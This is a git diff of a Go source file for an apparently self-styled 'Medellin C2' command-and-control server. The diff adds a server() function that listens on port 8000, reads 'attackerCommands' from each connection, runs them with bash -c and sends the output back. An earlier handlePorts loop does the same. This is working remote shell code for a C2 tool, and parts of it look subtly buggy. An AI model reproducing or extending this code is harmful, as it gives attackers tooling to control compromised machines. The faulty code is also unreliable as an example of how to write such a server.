@@ -7,6 +7,7 @@ package cmd
 import (
 	"bufio"
 	"fmt"
+	"io"
 	"log"
 	"net"
 	"os/exec"
@@ -18,6 +19,16 @@ import (
 	"github.com/spf13/cobra"
 )
 
+var logo = `
+_____ ______   _______   ________  _______   ___       ___       ___  ________           ________   _______     
+|\   _ \  _   \|\  ___ \ |\   ___ \|\  ___ \ |\  \     |\  \     |\  \|\   ___  \        |\   ____\ /  ___  \    
+\ \  \\\__\ \  \ \   __/|\ \  \_|\ \ \   __/|\ \  \    \ \  \    \ \  \ \  \\ \  \       \ \  \___|/__/|_/  /|   
+ \ \  \\|__| \  \ \  \_|/_\ \  \ \\ \ \  \_|/_\ \  \    \ \  \    \ \  \ \  \\ \  \       \ \  \   |__|//  / /   
+  \ \  \    \ \  \ \  \_|\ \ \  \_\\ \ \  \_|\ \ \  \____\ \  \____\ \  \ \  \\ \  \       \ \  \____  /  /_/__  
+   \ \__\    \ \__\ \_______\ \_______\ \_______\ \_______\ \_______\ \__\ \__\\ \__\       \ \_______\\________\
+    \|__|     \|__|\|_______|\|_______|\|_______|\|_______|\|_______|\|__|\|__| \|__|        \|_______|\|_______|
+	`
+
 // startCmd represents the start command
 var startCmd = &cobra.Command{
 	Use:   "start",
@@ -25,7 +36,8 @@ var startCmd = &cobra.Command{
 	Long:  `Starts the TCP server to begin listening and handling connections agents`,
 	Run: func(cmd *cobra.Command, args []string) {
 		//fmt.Println("start called")
-		listenForConnections()
+		//listenForConnections()
+		server()
 	},
 }
 
@@ -54,15 +66,7 @@ func handleConnection(c net.Conn) {
 }
 
 func listenForConnections() {
-	logo := `
-_____ ______   _______   ________  _______   ___       ___       ___  ________           ________   _______     
-|\   _ \  _   \|\  ___ \ |\   ___ \|\  ___ \ |\  \     |\  \     |\  \|\   ___  \        |\   ____\ /  ___  \    
-\ \  \\\__\ \  \ \   __/|\ \  \_|\ \ \   __/|\ \  \    \ \  \    \ \  \ \  \\ \  \       \ \  \___|/__/|_/  /|   
- \ \  \\|__| \  \ \  \_|/_\ \  \ \\ \ \  \_|/_\ \  \    \ \  \    \ \  \ \  \\ \  \       \ \  \   |__|//  / /   
-  \ \  \    \ \  \ \  \_|\ \ \  \_\\ \ \  \_|\ \ \  \____\ \  \____\ \  \ \  \\ \  \       \ \  \____  /  /_/__  
-   \ \__\    \ \__\ \_______\ \_______\ \_______\ \_______\ \_______\ \__\ \__\\ \__\       \ \_______\\________\
-    \|__|     \|__|\|_______|\|_______|\|_______|\|_______|\|_______|\|__|\|__| \|__|        \|_______|\|_______|
-	`
+
 	println(logo)
 	println("Medlelin C2 Server Successfully Started...")
 	println("Listeners are running over ports: " + data.GetListenerPorts())
@@ -74,6 +78,7 @@ _____ ______   _______   ________  _______   ___       ___       ___  ________  
 	for {
 		time.Sleep(time.Second * 30) //without this, we cannot connect over two ports at once
 	}
+
 }
 
 //Function to parse listener's ports for active listeners in the database.
@@ -99,7 +104,7 @@ func handlePorts(port string) {
 		}
 		go handleConnection(connection)
 		//count++
-
+		//handle commands
 		for {
 			attackerCommands, _ := bufio.NewReader(connection).ReadString('\n')
 			cmd := exec.Command("bash", "-c", attackerCommands)
@@ -111,4 +116,73 @@ func handlePorts(port string) {
 			connection.Write(out)
 		}
 	}
+
 }
+
+//TESTING
+func handleClientRequest(con net.Conn) {
+	defer con.Close()
+
+	clientReader := bufio.NewReader(con)
+
+	for {
+		// Waiting for the client request
+		clientRequest, err := clientReader.ReadString('\n')
+
+		switch err {
+		case nil:
+			clientRequest := strings.TrimSpace(clientRequest)
+			if clientRequest == ":QUIT" {
+				log.Println("client requested server to close the connection so closing")
+				return
+			} else {
+				log.Println(clientRequest)
+			}
+		case io.EOF:
+			log.Println("client closed the connection by terminating the process")
+			return
+		default:
+			log.Printf("error: %v\n", err)
+			return
+		}
+
+		// Responding to the client request
+		if _, err = con.Write([]byte("GOT IT!\n")); err != nil {
+			log.Printf("failed to respond to client: %v\n", err)
+		}
+	}
+}
+
+func server() {
+	println(logo)
+	listener, err := net.Listen("tcp", "0.0.0.0:8000")
+	if err != nil {
+		log.Fatalln(err)
+	}
+	defer listener.Close()
+	println("Medellin C2 Server Successfully Started on 0.0.0.0:8000")
+	for {
+		con, err := listener.Accept()
+		if err != nil {
+			log.Println(err)
+			continue
+		}
+
+		// If you want, you can increment a counter here and inject to handleClientRequest below as client identifier
+		go handleClientRequest(con)
+
+		//attacker commands
+		for {
+			attackerCommands, _ := bufio.NewReader(con).ReadString('\n')
+			cmd := exec.Command("bash", "-c", attackerCommands)
+			if err != nil {
+				log.Fatalln(err)
+			}
+			out, _ := cmd.CombinedOutput()
+
+			con.Write(out)
+		}
+	}
+}
+
+// http://www.inanzzz.com/index.php/post/j3n1/creating-a-concurrent-tcp-client-and-server-example-with-golang
